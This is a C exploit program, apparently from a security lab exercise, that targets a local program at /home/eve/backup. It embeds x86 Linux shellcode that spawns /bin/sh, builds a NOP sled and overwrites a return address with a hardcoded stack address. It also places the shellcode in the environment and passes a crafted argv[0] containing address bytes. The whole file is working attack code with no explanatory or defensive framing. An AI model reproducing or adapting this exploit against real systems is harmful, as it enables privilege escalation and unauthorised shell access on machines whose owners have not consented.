#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>

static char shellcode[] =
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";


int main(){



   FILE *fp;
   char *arg[4];
   char *env[1];
   int i=0;
   char op[182 + 150] = "";
   char buffer[350];
   int address = 0xffbfdfa0;
   int buflen = 185;
   char nop[] = "\x90";
   char *path = "/home/eve/backup";

   arg[1] = "backup";
   arg[2] = NULL;
   arg[3] = NULL;
   env[0] = shellcode;

   
   /* add nops*/
   for(i=0; i< buflen- strlen(shellcode); i= i+strlen("\x90")){
       strcat(op,nop); 
   }
   /* add shellcode */
   strcat(op,shellcode);
   
   for(i=0;i<buflen;++i){
      buffer[i] = op[i];
   }
   for(i=buflen;i<350;i+=4){
      buffer[i] = address & 0xff;
      buffer[i+1] = (address>>8) & 0xff;
      buffer[i+2] = ( address >>16) & 0xff;
      buffer[i+3] = (address >> 24) & 0xff;
   }
   buffer[330]=0;
   printf("%s\n",shellcode);
   fp = fopen("/share/foo","w+");
   fprintf(fp,"%s",op);
   
   fclose(fp);

/*   arg[2] = buffer;  97
   0xffbfdfa0
*/
     arg[0] = "%125d\xa0\xdf\xbf\xff\xa0\xdf\xbf\xff";

   if( execve(path,arg,env))
           fprintf(stderr, "execve failed.\n");

   exit(0);

return 0;
}


                       
